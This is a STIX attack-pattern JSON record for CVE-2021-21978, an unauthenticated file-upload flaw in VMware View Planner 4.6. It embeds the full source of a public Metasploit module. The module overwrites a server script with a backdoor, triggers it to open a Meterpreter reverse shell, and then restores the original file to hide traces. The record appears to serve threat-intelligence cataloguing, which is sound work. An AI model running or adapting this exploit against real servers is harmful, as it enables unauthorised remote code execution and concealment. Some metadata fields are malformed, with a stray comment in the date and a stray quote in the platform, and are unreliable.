{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce3a99f2-68d5-4d51-8e26-8eb90e6481f1",
    "created": "2024-08-14T17:03:14.088675Z",
    "modified": "2024-08-14T17:03:14.088679Z",
    "name": "VMware View Planner Unauthenticated Log File Upload RCE",
    "description": " This module exploits an unauthenticated log file upload within the log_upload_wsgi.py file of VMWare View Planner 4.6 prior to 4.6 Security Patch 1.  Successful exploitation will result in RCE as the apache user inside the appacheServer Docker container. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_view_planner_4_6_uploadlog_rce.rb",
            "external_id": "vmware_view_planner_4_6_uploadlog_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21978"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0003.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/fc456e03-adf5-409a-955a-8a4fb7e79ece#wvusPoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware View Planner Unauthenticated Log File Upload RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated log file upload within the\n          log_upload_wsgi.py file of VMWare View Planner 4.6 prior to 4.6\n          Security Patch 1.\n\n          Successful exploitation will result in RCE as the apache user inside\n          the appacheServer Docker container.\n        },\n        'Author' => [\n          'Mikhail Klyuchnikov', # Discovery\n          'wvu', # Analysis and PoC\n          'Grant Willcox' # Metasploit Module\n        ],\n        'References' => [\n          ['CVE', '2021-21978'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0003.html'],\n          ['URL', 'https://attackerkb.com/assessments/fc456e03-adf5-409a-955a-8a4fb7e79ece'] # wvu's PoC\n        ],\n        'DisclosureDate' => '2021-03-02', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Privileged' => false,\n        'Platform' => 'python',\n        'Targets' => [\n          [\n            'VMware View Planner 4.6.0',\n            {\n              'Arch' => ARCH_PYTHON,\n              'Type' => :linux_command,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wsgi_log_upload', 'log_upload_wsgi.py')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && !res.body.empty?\n      return CheckCode::Safe('log_upload_wsgi.py file not found at the expected location.')\n    end\n\n    @original_content = res.body # If the server responded with the contents of log_upload_wsgi.py, lets save this for later restoration.\n\n    if res.body&.include?('import hashlib') && res.body&.include?('if hashlib.sha256(password.value.encode(\"utf8\")).hexdigest()==secret_key:')\n      return CheckCode::Safe(\"Target's log_upload_wsgi.py file has been patched.\")\n    end\n\n    CheckCode::Appears('Vulnerable log_upload_wsgi.py file identified!')\n  end\n\n  # We need to upload a file twice: once for uploading the backdoor, and once for restoring the original file.\n  # As the code for both is the same, minus the content of the file, this is a generic function to handle that.\n  def upload_file(content)\n    mime = Rex::MIME::Message.new\n    mime.add_part(content, 'application/octet-stream', nil, \"form-data; name=\\\"logfile\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(20)}\\\"\")\n    mime.add_part('{\"itrLogPath\":\"/etc/httpd/html/wsgi_log_upload\",\"logFileType\":\"log_upload_wsgi.py\"}', nil, nil, 'form-data; name=\"logMetaData\"')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'logupload'),\n      'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n      'data' => mime.to_s\n    )\n    unless res.to_s.include?('File uploaded successfully.')\n      fail_with(Failure::UnexpectedReply, \"Target indicated that the file wasn't uploaded successfully!\")\n    end\n  end\n\n  def exploit\n    # Here we want to grab our template file, taken from a clean install but\n    # with a backdoor section added to it, and then fill in the PAYLOAD placeholder\n    # with the payload we want to execute.\n    data_dir = File.join(Msf::Config.data_directory, 'exploits', shortname)\n    file_content = File.read(File.join(data_dir, 'log_upload_wsgi.py'))\n\n    payload.encoded.gsub!(/\"/, '\\\\\"')\n    file_content['PAYLOAD'] = payload.encoded\n\n    # Now that things are primed, upload the file to the target.\n    print_status('Uploading backdoor to system via the arbitrary file upload vulnerability!')\n    upload_file(file_content)\n    print_good('Backdoor uploaded!')\n\n    # Use the OPTIONS request to trigger the backdoor. Technically this\n    # could be any other method including invalid ones like BACKDOOR, but for\n    # the purposes of stealth lets use a legitimate one.\n    print_status('Sending request to execute the backdoor!')\n    send_request_cgi(\n      'method' => 'OPTIONS',\n      'uri' => normalize_uri(target_uri.path, 'logupload')\n    )\n  ensure\n    # At this point we should have our shell after waiting a few seconds,\n    # so lets now restore the original file so we don't leave anything behind.\n    print_status('Reuploading the original code to remove the backdoor!')\n    upload_file(@original_content)\n    print_good('Original file restored, enjoy the shell!')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-03-02, # Vendor advisory",
    "x_mitre_platforms": [
        "python'"
    ]
}